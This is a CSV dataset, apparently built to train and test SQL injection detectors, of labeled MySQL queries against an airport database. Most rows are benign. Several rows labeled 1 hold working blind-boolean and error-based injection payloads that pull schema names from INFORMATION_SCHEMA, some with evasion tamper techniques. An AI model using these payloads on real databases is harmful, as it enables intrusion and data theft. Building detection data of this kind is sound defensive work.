"UPDATE countries SET keywords = ""Sierra Leonean airports""     WHERE    3228=3228    AND    9568=(   SELECT     (   CASE       WHEN   (  ORD(    MID((   SELECT         IFNULL(  CAST( column_name     AS     NCHAR  ),0x20)  FROM    INFORMATION_SCHEMA.   COLUMNS       WHERE       table_name =0x616972706f7274    AND    table_schema=0x64617461736574    LIMIT   10,1),11,1))>96)  THEN     9568     ELSE    (   SELECT     4247   UNION      SELECT     7822)  END  ))-- -"" WHERE code = ""IO"";",1," Sierra Leonean airports""     WHERE    3228=3228    AND    9568=(   SELECT     (   CASE       WHEN   (  ORD(    MID((   SELECT         IFNULL(  CAST( column_name     AS     NCHAR  ),0x20)  FROM    INFORMATION_SCHEMA.   COLUMNS       WHERE       table_name =0x616972706f7274    AND    table_schema=0x64617461736574    LIMIT   10,1),11,1))>96)  THEN     9568     ELSE    (   SELECT     4247   UNION      SELECT     7822)  END  ))-- - IO ",exploit,multiplespaces,success,update,airport-U8,boolean-96,boolean,test
"UPDATE airport SET municipality = ""Chah Mobarak"" WHERE iso_country = ""US""",0,Chah Mobarak US,,,,update,airport-U2,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""CA-BC""",0,SA CA-BC,,,,select,airport-S8,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""DK""",0,DK,,,,select,airport-S9,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (45386, ""SC44"", 4757.0, ""Turf"", 0, 0)",1, 45386 SC44 4757.0 Turf 0 0 ,recon,commentbeforeparentheses,success,insert,airport-I9,inline-53,inline,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Smith Airpark""",0,Smith Airpark,,,,select,airport-S3,,,test
"DELETE FROM airport WHERE name = ""Pau D`Arco Airport"";  ",0,Pau D`Arco Airport,,,,delete,airport-D2,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 295.0 AND 501.0",0,295.0 501.0,,,,select,airport-S2,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""PN17"") OR name LIKE ""Pointon""",0,PN17 Pointon,,,,select,airport-S10,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""NC"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,NC 2,,,,select,airport-S19,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Міжнародний аеропорт """"Донецьк"""", UKCC, DOK"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Kirklareli Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""مطارات قطر"", ""%"");",0,"Міжнародний аеропорт """"Донецьк"""", UKCC, DOK Airports in Kirklareli Province مطارات قطر",,,,select,airport-S18,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" WHeRe 6670=6670 anD 2824=(seleCT (CaSe WHEn (OrD(mID((seleCT IfNULl(caST(cOLumN_nAmE aS nchAr),0x20) From INFORMATION_SCHEMA.CoLUMnS WHeRe TABle_NAme=0x6e617661696473 anD table_schema=0x64617461736574 LimIT 12,1),12,1))>101) tHEn 2824 ELSe (seleCT 6140 UniOn seleCT 1509) ENd))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" WHeRe 6670=6670 anD 2824=(seleCT (CaSe WHEn (OrD(mID((seleCT IfNULl(caST(cOLumN_nAmE aS nchAr),0x20) From INFORMATION_SCHEMA.CoLUMnS WHeRe TABle_NAme=0x6e617661696473 anD table_schema=0x64617461736574 LimIT 12,1),12,1))>101) tHEn 2824 ELSe (seleCT 6140 UniOn seleCT 1509) ENd))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-1043"", ""small_airport"", ""El Lani Borderpost Helipad"", 31.5406, -88.561965)",0,US-1043 small_airport El Lani Borderpost Helipad 31.5406 -88.561965,,,,insert,airport-I1,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,train
GRANT SELECT ON sys.* TO 'info'@'localhost';,0,,,,,admin,airport-admin8,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (18893, ""SN47"", 7451.0'||(SELECT0x66677558�FROM
DUALWHERE4159=4159OR�(SELECT	5071
FROM(SELECT�COUNT(*),CONCAT(0x7178767671,(SELECT�(ELT(5071=5071,1))),0x7162786a71,FLOOR(RAND(0)*2))xFROM�INFORMATION_SCHEMA.PLUGINSGROUP�BYx)a))||', ""L"", 0, 0)",1," 18893 SN47 7451.0'||(SELECT0x66677558�FROM
DUALWHERE4159=4159OR�(SELECT	5071
FROM(SELECT�COUNT(* ,CONCAT(0x7178767671,(SELECT�(ELT(5071=5071,1   ,0x7162786a71,FLOOR(RAND(0 *2  xFROM�INFORMATION_SCHEMA.PLUGINSGROUP�BYx a  ||' L 0 0 ",recon,space2mysqlblank,success,insert,airport-I9,error-49,error,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 127.3 AND  118.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.95  AND  122.7  ORDER BY frequency;",0,127.3 118.7 122.95 122.7,,,,select,airport-S13,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""ES""",0,ES,,,,select,airport-S6,,,test
"UPDATE airport SET name = ""St Thomas Hospital Heliport"" WHERE ident = ""US-0074""",0,St Thomas Hospital Heliport US-0074,,,,update,airport-U1,,,train
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Mulara;""",0,Mulara,,,,select,airport-S21,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Potgietersrus Airport"");",0,Potgietersrus Airport,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SM"" GROUP BY r.name ORDER BY r.name ASC;",0,SM,,,,select,airport-S16,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Loudon Justice Center Heliport"");",0,Loudon Justice Center Heliport,,,,select,airport-S12,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Winnebago Industries Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Winnebago Industries Airport,,,,select,airport-S14,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Central Abaco"";",0,Central Abaco,,,,select,airport-S15,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LK"" GROUP BY r.name ORDER BY r.name ASC;",0,LK,,,,select,airport-S16,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""2110 South M-76 Heliport""",0,2110 South M-76 Heliport,,,,select,airport-S3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 131.95 AND  123.0  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.125  AND  119.675  ORDER BY frequency;",0,131.95 123.0 122.125 119.675,,,,select,airport-S13,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""SI"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,SI 2,,,,select,airport-S19,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(6781,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x616972706f7274/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/4,1),12,1))>96)/**/THEN/**/6781/**/ELSE/**/0x3A/**/END)/**/AND/**/""DGtV""=""DGtV"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(6781,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x616972706f7274/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/4,1),12,1))>96)/**/THEN/**/6781/**/ELSE/**/0x3A/**/END)/**/AND/**/""DGtV""=""DGtV Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT id FROM airports WHERE scheduled_service LIKE ""no"" AND type IN (""heliport"",""heliport"") AND elevation_feet BETWEEN 750.0 AND 935.0 AND longitude >= -113.824282",0,no heliport heliport 750.0 935.0 -113.824282,,,,select,airport-S23,,,test
"SELECT * FROM airport WHERE gps_code = ""21LA"" OR local_code = ""SIVA""",0,21LA SIVA,,,,select,airport-S4,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 268.0",0,US 268.0,,,,select,airport-S11,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""2NK9"";",0,2NK9,,,,select,airport-S7,,,test
"UPDATE airport SET home_link = ""http://cotebasqueparamoteur.fr"" WHERE name = ""Centum Green Tower Apartments Heliport""",0,http://cotebasqueparamoteur.fr Centum Green Tower Apartments Heliport,,,,update,airport-U4,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 2828=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 8,1),1,1))>107) then 2828 else (select 5410 union select 4484) end))-- -""",1," Jindal Heliport  and 2828=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 8,1),1,1))>107) then 2828 else (select 5410 union select 4484) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"UPDATE airport SET name = ""Las Vegas Airport"" WHERE ident = ""US-11078""",0,Las Vegas Airport US-11078,,,,update,airport-U1,,,test
"DELETE FROM navaids WHERE ident = ""CRL"";",0,CRL,,,,delete,airport-D6,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""MT17"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""22LL"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Los Angeles County Sheriff's Department Castaic"", ""%"");",0,MT17 22LL Los Angeles County Sheriff's Department Castaic,,,,select,airport-S17,,,test
"UPDATE airport_frequencies SET description = ""VICTORIA MULTI"" WHERE airport_ident = ""K64S"";",0,VICTORIA MULTI K64S,,,,update,airport-U5,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""US-MI""",0,AS US-MI,,,,select,airport-S8,,,train
"UPDATE navaids SET name = ""Nampula"" WHERE ident = ""KEF"";",0,Nampula KEF,,,,update,airport-U7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Zabaykalsky Krai"";",0,Zabaykalsky Krai,,,,select,airport-S15,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""IQ"") OR a.elevation_ft > 561.0",0,IQ 561.0,,,,select,airport-S11,,,test
"SELECT id FROM airports WHERE type IN (""small_airport"",""small_airport"") AND name LIKE ""%h9C2cchS5Ixh8dvBhBMg%"" OR name LIKE ""%mPN0wenv3oXvQOUcfHF4%"" AND elevation_feet <= 1752.0",0,small_airport small_airport h9C2cchS5Ixh8dvBhBMg mPN0wenv3oXvQOUcfHF4 1752.0,,,,select,airport-S23,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 955.0 AND 34.0",0,955.0 34.0,,,,select,airport-S2,,,test
"UPDATE airport SET name = ""Capital Center Heliport"" WHERE ident = ""FCPE""",0,Capital Center Heliport FCPE,,,,update,airport-U1,,,train
"DELETE FROM airport WHERE ident=""SJ6T"";",0,SJ6T,,,,delete,airport-D1,,,test
SELECT * FROM airport WHERE icao_code = 'FCPP';,0,FCPP,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2290"" AS SIGNED) AND a.iso_country = ""IN"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2290 IN,,,,select,airport-S22,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""УНИА, Айдара"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Moka"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""中国的机场"", ""%"");",0,"УНИА, Айдара Airports in Moka 中国的机场",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-0549"", ""-5814'))) OR 8062 LIKE 8062#"", ""Wonder Valley Airport"", -18.033436, 121.67017, 68.0)",1, US-0549 -5814'    OR 8062 LIKE 8062# Wonder Valley Airport -18.033436 121.67017 68.0 ,recon,equaltolike,failure,insert,airport-I2,boolean-6,boolean,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MP"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,MP 2,,,,select,airport-S19,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""VIB, VIB"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WT17"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Marsworth"", ""%"");",0,"VIB, VIB WT17 Marsworth",,,,select,airport-S17,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""BG"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,BG 4,,,,select,airport-S19,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('VE-0155','JP-1251','LTBH','8MN7');",0,VE-0155 JP-1251 LTBH 8MN7,,,,update,airport-U10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BS"" GROUP BY r.name ORDER BY r.name ASC;",0,BS,,,,select,airport-S5,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Sobolevo Airport""",0,Sobolevo Airport,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""BR""",0,BR,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""YE"" GROUP BY r.name ORDER BY r.name ASC;",0,YE,,,,select,airport-S16,,,test
"UPDATE navaids SET name = ""Targu Mures"" WHERE 1690=1690 AND GTID_SUBSET/**/(CONCAT/**/(0x7176787671,(SELECT IFNULL/**/(CAST/**/(COUNT/**/(*) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x716a6a6271),3295)-- rnan"" WHERE ident = ""TD"";",1," Targu Mures"" WHERE 1690=1690 AND GTID_SUBSET/**/(CONCAT/**/(0x7176787671,(SELECT IFNULL/**/(CAST/**/(COUNT/**/(*) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x716a6a6271),3295)-- rnan TD ",exploit,commentbeforeparentheses,success,update,airport-U7,error-91,error,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Sun City Ginza East Helipad"");",0,Sun City Ginza East Helipad,,,,select,airport-S12,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""AD6"") And 3451=(SeleCt (cAsE WHeN (oRD(MId((SeleCt IfnuLL(caSt(cOLUMn_NaME aS nChAr),0x20) froM INFORMATION_SCHEMA.cOlUMnS WHeRe TABLe_name=0x726567696f6e73 And table_schema=0x64617461736574 LimiT 2,1),7,1))>98) thEn 3451 eLSE (SeleCt 2399 unIon SeleCt 6574) End))-- -"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Smartno pri Litiji"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""नेपाल विमानस्थलको"", ""%"");",1," AD6"") And 3451=(SeleCt (cAsE WHeN (oRD(MId((SeleCt IfnuLL(caSt(cOLUMn_NaME aS nChAr),0x20) froM INFORMATION_SCHEMA.cOlUMnS WHeRe TABLe_name=0x726567696f6e73 And table_schema=0x64617461736574 LimiT 2,1),7,1))>98) thEn 3451 eLSE (SeleCt 2399 unIon SeleCt 6574) End))-- - Airports in Smartno pri Litiji नेपाल विमानस्थलको ",exploit,randomcase,success,select,airport-S18,boolean-246,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""ZZ"" GROUP BY r.name ORDER BY r.name ASC;",0,ZZ,,,,select,airport-S5,,,test
"SELECT * FROM airport WHERE gps_code = ""MY93"" OR local_code = ""VT03""",0,MY93 VT03,,,,select,airport-S4,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 3072=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 14,1),2,1))>98) then 3072 else (select 3628 union select 5596) end))-- -""",1," Jindal Heliport  and 3072=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 14,1),2,1))>98) then 3072 else (select 3628 union select 5596) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AO"" GROUP BY r.name ORDER BY r.name ASC;",0,AO,,,,select,airport-S5,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Ellington Field"") OR name LIKE ""SSRQ""",0,Ellington Field SSRQ,,,,select,airport-S10,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""FR-NOR""",0,AS FR-NOR,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GQ"" GROUP BY r.name ORDER BY r.name ASC;",0,GQ,,,,select,airport-S5,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Harvey's Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Harvey's Airport,,,,select,airport-S14,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""ID"", ""Nepal"", ""AF"", ""Serb"")",0,ID Nepal AF Serb,,,,insert,airport-I6,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""JP-1276"", ""small_airport"", ""Teague Municipal Airport"", 50.853737, -120.431862, 3660.0)",0,JP-1276 small_airport Teague Municipal Airport 50.853737 -120.431862 3660.0,,,,insert,airport-I2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""DE"") OR a.elevation_ft > 728.0",0,DE 728.0,,,,select,airport-S11,,,test
"UPDATE regions SET keywords = ""Airports in Milne Bay Province"" WHERE iso_country = ""GH"";",0,Airports in Milne Bay Province GH,,,,update,airport-U9,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91894, ""VNV"", ""Taba"", ""VOR"", 242, ""US"")",0,91894 VNV Taba VOR 242 US,,,,insert,airport-I10,,,test
"SELECT id FROM airports WHERE ( FIND_IN_SET(""jSiFiwShVeLrW22eICYO"", keywords_field) > 0) AND name LIKE ""%ZpRaze9BmSlDdrrNh4Aw%"" AND type LIKE ""small_airport""",0,jSiFiwShVeLrW22eICYO ZpRaze9BmSlDdrrNh4Aw small_airport,,,,select,airport-S23,,,test
"DELETE FROM regions WHERE name = ""(unassigned)"";",0,(unassigned),,,,delete,airport-D8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jusarah Agro Aérea Airport""",0,Jusarah Agro Aérea Airport,,,,select,airport-S3,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Mukho"") OR name LIKE ""Marial Bai""",0,Mukho Marial Bai,,,,select,airport-S10,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 1716.0",0,US 1716.0,,,,select,airport-S11,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""ZULZ"";",0,ZULZ,,,,select,airport-S7,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (62921, 3434, ""YDUN"", ""RDR"", ""ATF/UNICOM"", 119.1)",0,62921 3434 YDUN RDR ATF/UNICOM 119.1,,,,insert,airport-I8,,,test
"UPDATE airport SET home_link = ""http://www.aero-club-tbb.de/file/Willkommen.html"" WHERE name = ""Tancredo Thomas de Faria Airport""",0,http://www.aero-club-tbb.de/file/Willkommen.html Tancredo Thomas de Faria Airport,,,,update,airport-U4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MZ"" GROUP BY r.name ORDER BY r.name ASC;",0,MZ,,,,select,airport-S5,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""LA"", ""Canada"", ""AS"", ""Airports in Vanuatu"")",0,LA Canada AS Airports in Vanuatu,,,,insert,airport-I6,,,test
"DELETE FROM countries WHERE code = ""KP"";",0,KP,,,,delete,airport-D7,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CO""",0,CO,,,,select,airport-S6,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""ZA""",0,ZA,,,,select,airport-S6,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""LB"", ""Andorra"", ""AF"", ""Airports in São Tomé and Principe"")",0,LB Andorra AF Airports in São Tomé and Principe,,,,insert,airport-I6,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (87177, ""HGV"", ""Piedras"", ""VORTAC"", 373, ""CA"")",0,87177 HGV Piedras VORTAC 373 CA,,,,insert,airport-I10,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 123.4 AND  134.0  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  120.8  AND  126.7  ORDER BY frequency;",0,123.4 134.0 120.8 126.7,,,,select,airport-S13,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Porto Jofre Airport"");",0,Porto Jofre Airport,,,,select,airport-S12,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Goiânia"" and 3108=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 13,1),12,1))>104) then 3108 else (select 6384 union select 6410) end))-- -;""",1," Goiânia"" and 3108=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 13,1),12,1))>104) then 3108 else (select 6384 union select 6410) end))-- - ",exploit,lowercase,success,select,airport-S21,boolean-258,boolean,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""CA-NU""",0,AF CA-NU,,,,select,airport-S8,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""PA8"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Bay, باي"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Palauan airports"", ""%"");",0,"PA8 Airports in Bay, باي Palauan airports",,,,select,airport-S18,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('SEJA','OR50','GE-0004','US-8585');",0,SEJA OR50 GE-0004 US-8585,,,,update,airport-U10,,,test
"DELETE FROM runways WHERE airport_ident = ""5F8"";",0,5F8,,,,delete,airport-D5,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""VC"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,VC 2,,,,select,airport-S19,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""IN-LA""",0,AS IN-LA,,,,select,airport-S8,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""JP-3520"", ""small_airport"", ""Fazenda Fartura Airport"", 24.656563, -116.667916667, 574.0)",0,JP-3520 small_airport Fazenda Fartura Airport 24.656563 -116.667916667 574.0,,,,insert,airport-I2,,,test
